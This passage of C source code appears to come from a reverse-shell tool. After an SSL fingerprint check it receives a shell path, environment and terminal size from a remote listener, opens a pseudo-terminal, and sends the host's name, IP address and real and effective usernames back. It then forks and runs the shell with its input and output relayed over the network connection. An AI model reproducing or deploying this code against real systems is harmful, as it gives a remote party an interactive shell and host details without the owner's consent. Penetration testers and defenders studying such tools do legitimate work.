					fprintf(stderr, "Remote fingerprint received:\n\t%s\n", remote_fingerprint_str);
					fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
							program_invocation_short_name, io.listener);
#endif
					exit(-1);
				}
			}
		}

		// - Check for usage and exit, if needed. 
		// We do this after the network connect so the error
		// reporting gets sent back to the listener, if possible.
		if(shell){
			print_error(&io, "%s: %d: remote usage error: Only listeners can invoke -s!\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		// - Receive and set the shell.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, %d): %s\r\n", \
					program_invocation_short_name, io.listener, (unsigned long) &io, (unsigned long) &tmp_char, 1, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: shell\r\n", program_invocation_short_name, io.listener);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Shell string too long.\r\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		tmp_len = strlen(buff_head);
		if((shell = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
			print_error(&io, "%s: %d: calloc(%d, %d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					tmp_len + 1, (int) sizeof(char), strerror(errno));
			exit(-1);
		}
		memcpy(shell, buff_head, tmp_len);


		// - Receive and set the initial environment.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: environment\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Environment string too long.\r\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		if((exec_envp = string_to_vector(buff_head)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					buff_head, strerror(errno));
			exit(-1);
		}

		// - Receive and set the initial termios.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: termios\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: termios string too long.\r\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		if((tmp_vector = string_to_vector(buff_head)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if(tmp_vector[0] == NULL){
			print_error(&io, "%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		errno = 0;
		tty_winsize.ws_row = strtol(tmp_vector[0], NULL, 10);
		if(errno){
			print_error(&io, "%s: %d: strtol(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if(tmp_vector[1] == NULL){
			print_error(&io, "%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		errno = 0;
		tty_winsize.ws_col = strtol(tmp_vector[1], NULL, 10);
		if(errno){
			print_error(&io, "%s: %d: strtol(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		// - Create a pseudo-terminal (pty).
		if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
			print_error(&io, "%s: %d: posix_openpt(O_RDWR|O_NOCTTY): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if((retval = grantpt(pty_master)) == -1){
			print_error(&io, "%s: %d: grantpt(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((retval = unlockpt(pty_master)) == -1){
			print_error(&io, "%s: %d: unlockpt(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((retval = ioctl(pty_master, TIOCSWINSZ, &tty_winsize)) == -1){
			print_error(&io, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, TIOCGWINSZ, (unsigned long) &tty_winsize, strerror(errno));
			exit(-1);
		}

		if((pty_name = ptsname(pty_master)) == NULL){
			print_error(&io, "%s: %d: ptsname(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
			print_error(&io, "%s: %d: open(%s, O_RDWR|O_NOCTTY): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_name, strerror(errno));
			exit(-1);
		}

		// - Send basic information back to the listener about the connecting host.
		//   (e.g. hostname, ip address, username)
		memset(buff_head, 0, buff_len);
		if((retval = gethostname(buff_head, buff_len - 1)) == -1){
			print_error(&io, "%s: %d: gethostname(%lx, %d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) buff_head, buff_len - 1, strerror(errno));
			exit(-1);
		}

		remote_printf(&io, "################################\r\n");
		remote_printf(&io, "# hostname: %s\r\n", buff_head);

		io.ip_addr = BIO_get_conn_ip(io.connect);
		remote_printf(&io, "# ip address: %d.%d.%d.%d\r\n", io.ip_addr[0], io.ip_addr[1], io.ip_addr[2], io.ip_addr[3]);

		// if the uid doesn't match an entry in /etc/passwd, we don't want to crash.
		// Borrowed the "I have no name!" from bash, as that is what it will display in this situation arises.
		passwd_entry = getpwuid(getuid());
		remote_printf(&io, "# real user: ");
		if(passwd_entry && passwd_entry->pw_name){
			remote_printf(&io, "%s", passwd_entry->pw_name);
		}else{
			remote_printf(&io, "I have no name!");
		}
		remote_printf(&io, "\r\n");

		passwd_entry = getpwuid(geteuid());
		remote_printf(&io, "# effective user: ");
		if(passwd_entry && passwd_entry->pw_name){
			remote_printf(&io, "%s", passwd_entry->pw_name);
		}else{
			remote_printf(&io, "I have no name!");
		}
		remote_printf(&io, "\r\n");

		remote_printf(&io, "################################\r\n");


		if((retval = close(STDIN_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDIN_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if((retval = close(STDOUT_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDOUT_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

#ifndef DEBUG

		if((retval = close(STDERR_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDERR_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}
#endif

		// - Fork a child to run the shell.
		retval = fork();

		if(retval == -1){
			print_error(&io, "%s: %d: fork(): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if(retval){

			// - Parent: Enter the broker() and broker data.
			if((retval = close(pty_slave)) == -1){
				print_error(&io, "%s: %d: close(%d): %s\r\n", \
						program_invocation_short_name, io.listener, \
						pty_slave, strerror(errno));
				exit(-1);
			}

			io.local_fd = pty_master;

			retval = broker(&io);

			if((retval == -1)){
				print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, strerror(errno));
				exit(-1);
			}

			if(io.encryption){
				SSL_shutdown(io.ssl);
				SSL_free(io.ssl);
				SSL_CTX_free(io.ctx);
			}

			return(0);
		}

		// - Child: Initialize file descriptors.
		if((retval = close(pty_master)) == -1){
			print_error(&io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}
		if((retval = dup2(pty_slave, STDIN_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, STDIN_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_slave, strerror(errno));
			exit(-1);
		}

		if((retval = dup2(pty_slave, STDOUT_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, STDOUT_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_slave, strerror(errno));
			exit(-1);
		}

		if((retval = dup2(pty_slave, STDERR_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, %d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_slave, STDERR_FILENO, strerror(errno));
			exit(-1);
		}

		if((retval = close(io.remote_fd)) == -1){
			print_error(&io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					io.remote_fd, strerror(errno));
			exit(-1);
		}

		if((retval = close(pty_slave)) == -1){
			error(-1, errno, "close(%d)", pty_slave);
		}

		if((retval = setsid()) == -1){
			error(-1, errno, "setsid()");
		} 

		// - Child: Set the pty as controlling.
		if((retval = ioctl(STDIN_FILENO, TIOCSCTTY, 1)) == -1){
			error(-1, errno, "ioctl(STDIN_FILENO, TIOCSCTTY, 1)");
		}

		// - Child: Call execve() to invoke a shell.
		errno = 0;
		if((exec_argv = string_to_vector(shell)) == NULL){
			error(-1, errno, "string_to_vector(%s)", shell);
		}

		execve(exec_argv[0], exec_argv, exec_envp);
		error(-1, errno, "execve(%s, %lx, NULL): shouldn't be here.", \
				exec_argv[0], (unsigned long) exec_argv);
	}

	return(-1);
}
